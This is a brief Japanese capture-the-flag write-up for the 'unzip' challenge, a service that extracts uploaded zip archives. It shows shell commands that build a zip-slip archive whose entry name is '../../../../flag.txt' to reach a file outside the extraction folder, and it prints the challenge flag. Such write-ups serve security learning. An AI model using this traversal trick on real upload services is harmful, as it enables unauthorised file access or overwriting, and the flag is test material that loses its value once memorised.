# unzip

188 pt (118 Solves)

```txt
Unzip Your .zip Archive Like a Pro.
[url]
```

## 概要

zipファイルをアップロードしたら解凍してくれる。  
urlでディレクトリトラバーサル的な事ができそうだったけどできなかった。

## 解

zipslipやっていく。

```txt
touch flag.txt
mkdir -p dir/dir/dir/dir
cd dir/dir/dir/dir
zip zip-slip.zip ../../../../flag.txt
```

`zip-slip.zip`をアップロードして解凍させる。`../../../../flag.txt`を開けばflag。

```txt
ctf4b{y0u_c4nn07_7ru57_4ny_1npu75_1nclud1n6_z1p_f1l3n4m35}
```
